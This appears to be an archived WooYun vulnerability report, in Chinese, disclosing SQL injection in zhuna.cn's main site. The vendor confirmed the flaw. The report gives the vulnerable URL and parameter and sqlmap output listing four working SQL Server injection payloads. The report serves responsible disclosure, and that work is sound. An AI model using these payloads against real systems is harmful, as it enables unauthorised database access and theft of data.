{"id": 44497, "wybug_id": "wooyun-2015-0100054", "wybug_title": "住哪网主站存在SQL注入漏洞", "wybug_corp": "住哪网", "wybug_author": "疏懒", "wybug_date": "2015-03-09 12:03", "wybug_open_date": "2015-04-23 12:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向公众公开  简要描述： 住哪网主站存在SQL注入漏洞 详细说明：  注入点\nhttp://www.zhuna.cn/e/b2.php?hid=88952634&rid=88952634&pid=88952634&tm1=2015-3-8&tm2=2015-3-10#47436f33-d5e2-4310-8d4a-9eec17a9e962\n经检测，参数hid存在注入   漏洞证明：  \nsqlmap identified the following injection points with a total of 48 HTTP(s) requests:---Place: GETParameter: hid    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)    Payload: hid=(SELECT (CASE WHEN (4885=4885) THEN 88952634 ELSE 4885*(SELECT4885 FROM master..sysdatabases) END))&rid=88952634&pid=88952634&tm1=2015-3-8&tm2=2015-3-10    Type: error-based    Title: Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause    Payload: hid=-9548 OR 3123=CONVERT(INT,(CHAR(58) CHAR(120) CHAR(122) CHAR(120) CHAR(58) (SELECT (CASE WHEN (3123=3123) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(108) CHAR(111) CHAR(100) CHAR(58)))&rid=88952634&pid=88952634&tm1=2015-3-8&tm2=2015-3-10    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: hid=-3737 OR 2638=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)&rid=88952634&pid=88952634&tm1=2015-3-8&tm2=2015-3-10    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: hid=(SELECT CHAR(58) CHAR(120) CHAR(122) CHAR(120) CHAR(58) (SELECT (CASE WHEN (4578=4578) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(108) CHAR(111) CHAR(100) CHAR(58))&rid=88952634&pid=88952634&tm1=2015-3-8&tm2=2015-3-10---[19:36:04] [INFO] testing Microsoft SQL Server[19:36:04] [INFO] confirming Microsoft SQL Server[19:36:05] [INFO] the back-end DBMS is Microsoft SQL Serverback-end DBMS: Microsoft SQL Server 2008[19:36:05] [INFO] fetching database names\n\n\n   修复方案：  你们专业   版权声明：转载请注明来源 疏懒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-03-09 13:38 厂商回复： 非常感谢您反馈的信息，相关修复已交由技术处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-09 13:15 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  主站！    \n     2015-04-24 11:42 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  这链接怎么找的啊。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}